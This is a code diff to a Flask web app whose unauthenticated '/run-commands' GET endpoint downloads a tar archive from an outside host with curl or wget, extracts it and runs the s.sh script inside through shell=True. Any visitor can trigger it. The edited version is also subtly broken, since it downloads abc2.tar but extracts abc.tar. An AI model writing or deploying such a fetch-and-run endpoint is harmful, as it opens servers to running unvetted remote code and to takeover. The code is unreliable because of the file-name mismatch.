@@ -12,16 +12,12 @@ def get_pwd():
 @app.route('/run-commands', methods=['GET'])
 def run_commands():
     try:
-   
         commands = [
-            "curl -O https://idev.nyc.mn/abc2.tar",
-            "ls",
-            "tar -xvf abc2.tar",
-            "cd abc",
-            "sh s.sh"
+            "wget https://idev.nyc.mn/abc2.tar",
+            "tar -xvf abc.tar",
+            "cd abc && sh s.sh"  # 合并 cd 和后续命令
         ]
         result = ""
-    
         for command in commands:
             process = subprocess.run(
                 command, shell=True, text=True, capture_output=True
@@ -30,8 +26,8 @@ def run_commands():
                 result += f"Command: {command}\nOutput: {process.stdout}\n"
             else:
                 result += f"Command: {command}\nError: {process.stderr}\n"
-                break  
-        
+                break  # 停止执行后续命令
+
         return jsonify({"status": "success", "result": result})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
